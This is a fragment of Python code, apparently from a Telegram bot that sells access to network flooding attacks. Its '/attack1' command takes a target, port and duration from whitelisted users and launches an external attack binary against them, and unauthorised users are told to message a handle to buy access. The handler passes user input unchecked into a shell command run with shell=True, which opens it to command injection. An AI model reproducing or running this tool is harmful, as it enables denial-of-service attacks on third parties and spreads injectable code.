    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 300:
                ...
                full_command = f"./GOD_OFF_LSR {target} {port} {time} 900"
                subprocess.run(full_command, shell=True)
                response = f"GOD_OFF_LSR 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY GOD_OFF_LSR"
        else:
            response = "Usage :- /attack1 <target> <port> <time>\nBy GOD_OFF_LSR"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @GOD_OFF_LSR 90"
